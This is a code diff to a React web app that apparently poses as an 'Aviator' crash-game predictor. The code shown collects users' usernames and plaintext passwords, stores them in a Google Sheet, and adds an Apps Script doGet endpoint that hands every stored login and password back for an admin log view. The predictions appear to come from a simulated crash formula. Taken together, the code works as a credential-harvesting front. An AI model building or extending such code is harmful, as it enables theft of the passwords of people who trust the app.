@@ -64,12 +64,15 @@ export default function App() {
   // Real-time Excel database live counter states
   const [excelStats, setExcelStats] = useState<{ logins: number; predictions: number }>({ logins: 0, predictions: 0 });
 
-  // Online Sheet settings variables
-  const [onlineSheetUrl, setOnlineSheetUrl] = useState<string>("");
+  // Online Sheet settings variables - integrated with localStorage fallback for stateless Vercel environments
+  const [onlineSheetUrl, setOnlineSheetUrl] = useState<string>(() => {
+    return localStorage.getItem("aviator_online_sheet_url") || "";
+  });
   const [testStatus, setTestStatus] = useState<{ type: "idle" | "success" | "error" | "pinging"; message: string }>({ type: "idle", message: "" });
   const [showScriptGuide, setShowScriptGuide] = useState<boolean>(false);
 
   // Timer for flicker interval
+  // ... rest of refs ...
   const flickerTimerRef = useRef<NodeJS.Timeout | null>(null);
 
   // Authentically-inspired crash formula distribution
@@ -83,8 +86,13 @@ export default function App() {
 
   // Fetch current database statistics from our server Excel file
   const fetchExcelDatabaseStats = async () => {
+    const currentUrl = onlineSheetUrl || localStorage.getItem("aviator_online_sheet_url") || "";
     try {
-      const response = await fetch("/api/excel/data");
+      const response = await fetch("/api/excel/data", {
+        headers: {
+          "x-online-sheet-url": currentUrl
+        }
+      });
       if (response.ok) {
         const data = await response.json();
         setExcelStats({
@@ -103,18 +111,33 @@ export default function App() {
       const response = await fetch("/api/excel/settings");
       if (response.ok) {
         const data = await response.json();
-        if (data && typeof data.onlineSheetUrl === "string") {
+        if (data && typeof data.onlineSheetUrl === "string" && data.onlineSheetUrl) {
           setOnlineSheetUrl(data.onlineSheetUrl);
+          localStorage.setItem("aviator_online_sheet_url", data.onlineSheetUrl);
+        } else {
+          const cachedUrl = localStorage.getItem("aviator_online_sheet_url") || "";
+          if (cachedUrl) {
+            setOnlineSheetUrl(cachedUrl);
+          }
         }
       }
     } catch (err) {
       console.warn("Could not retrieve online sheet link settings on boot.", err);
+      const cachedUrl = localStorage.getItem("aviator_online_sheet_url") || "";
+      if (cachedUrl) {
+        setOnlineSheetUrl(cachedUrl);
+      }
     }
   };
 
   const fetchAdminLogs = async () => {
+    const currentUrl = onlineSheetUrl || localStorage.getItem("aviator_online_sheet_url") || "";
     try {
-      const response = await fetch("/api/excel/data");
+      const response = await fetch("/api/excel/data", {
+        headers: {
+          "x-online-sheet-url": currentUrl
+        }
+      });
       if (response.ok) {
         const data = await response.json();
         setAdminLogins(Array.isArray(data.logins) ? data.logins : []);
@@ -127,9 +150,14 @@ export default function App() {
 
   const handleSaveSettings = async (urlVal: string) => {
     try {
+      localStorage.setItem("aviator_online_sheet_url", urlVal);
+      setOnlineSheetUrl(urlVal);
       const response = await fetch("/api/excel/settings", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "x-online-sheet-url": urlVal
+        },
         body: JSON.stringify({ onlineSheetUrl: urlVal })
       });
       if (response.ok) {
@@ -176,9 +204,13 @@ export default function App() {
 
     // Save login credentials directly into our spreadsheet
     try {
+      const currentUrl = onlineSheetUrl || localStorage.getItem("aviator_online_sheet_url") || "";
       await fetch("/api/store/login", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "x-online-sheet-url": currentUrl
+        },
         body: JSON.stringify({ username: cleanUsername, password: password || "" })
       });
       // Refresh count
@@ -266,9 +298,13 @@ export default function App() {
 
     // Archive this prediction in our spreadsheet sheet "Predictions" (non-blocking server store)
     try {
+      const currentUrl = onlineSheetUrl || localStorage.getItem("aviator_online_sheet_url") || "";
       await fetch("/api/store/prediction", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "x-online-sheet-url": currentUrl
+        },
         body: JSON.stringify({
           username: activeUsername,
           prediction: `${resultVal.toFixed(2)}x`
@@ -759,6 +795,39 @@ export default function App() {
     return ContentService.createTextOutput(JSON.stringify({ success: false, error: e.toString() }))
       .setMimeType(ContentService.MimeType.JSON);
   }
+}
+
+function doGet(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    var rows = sheet.getDataRange().getValues();
+    if (rows.length <= 1) {
+      return ContentService.createTextOutput(JSON.stringify({ logins: [], predictions: [] }))
+        .setMimeType(ContentService.MimeType.JSON);
+    }
+    var logins = [];
+    var predictions = [];
+    for (var i = 1; i < rows.length; i++) {
+      var row = rows[i];
+      var entry = {
+        Timestamp: row[0],
+        Type: row[1],
+        Username: row[2],
+        Password: row[3],
+        PredictionValue: row[4]
+      };
+      if (entry.Type === "Logins") {
+        logins.push(entry);
+      } else if (entry.Type === "Predictions") {
+        predictions.push(entry);
+      }
+    }
+    return ContentService.createTextOutput(JSON.stringify({ logins: logins, predictions: predictions }))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch(e) {
+    return ContentService.createTextOutput(JSON.stringify({ error: e.toString() }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
 }`);
                             alert("Apps Script copied directly!");
                           }}
@@ -767,7 +836,7 @@ export default function App() {
                           Copy Script
                         </button>
                       </div>
-                      <pre className="p-2 bg-neutral-950/90 text-amber-500 font-mono text-[7px] leading-tight overflow-x-auto rounded-lg max-h-[100px] border border-white/[0.04]">
+                      <pre className="p-2 bg-neutral-950/90 text-amber-500 font-mono text-[7px] leading-tight overflow-x-auto rounded-lg max-h-[140px] border border-white/[0.04]">
 {`function doPost(e) {
   try {
     var data = JSON.parse(e.postData.contents);
@@ -786,6 +855,39 @@ export default function App() {
       .setMimeType(ContentService.MimeType.JSON);
   } catch(e) {
     return ContentService.createTextOutput(JSON.stringify({ success: false, error: e.toString() }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function doGet(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    var rows = sheet.getDataRange().getValues();
+    if (rows.length <= 1) {
+      return ContentService.createTextOutput(JSON.stringify({ logins: [], predictions: [] }))
+        .setMimeType(ContentService.MimeType.JSON);
+    }
+    var logins = [];
+    var predictions = [];
+    for (var i = 1; i < rows.length; i++) {
+      var row = rows[i];
+      var entry = {
+        Timestamp: row[0],
+        Type: row[1],
+        Username: row[2],
+        Password: row[3],
+        PredictionValue: row[4]
+      };
+      if (entry.Type === "Logins") {
+        logins.push(entry);
+      } else if (entry.Type === "Predictions") {
+        predictions.push(entry);
+      }
+    }
+    return ContentService.createTextOutput(JSON.stringify({ logins: logins, predictions: predictions }))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch(e) {
+    return ContentService.createTextOutput(JSON.stringify({ error: e.toString() }))
       .setMimeType(ContentService.MimeType.JSON);
   }
 }`}
